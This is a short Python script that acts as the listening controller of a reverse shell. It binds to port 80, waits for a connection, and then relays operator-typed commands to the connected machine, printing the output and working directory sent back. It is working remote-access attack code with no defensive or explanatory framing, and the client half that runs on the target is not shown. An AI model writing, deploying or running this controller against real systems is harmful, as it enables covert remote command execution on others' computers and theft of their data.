import os
import socket
import time

HOST = "0.0.0.0"
PORT = 80
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(5)
    conn, addr = s.accept()
    
    cwd = conn.recv(BUFFER_SIZE).decode()
    print(f"[+] Current Directory: {cwd}\n")
    
    while True:
    
        command = input(f"{cwd} $> ")
        
        if not command.strip():
            continue
        
        conn.send(command.encode())
        
        if command.lower() == "exit":
            break
       
        output = conn.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)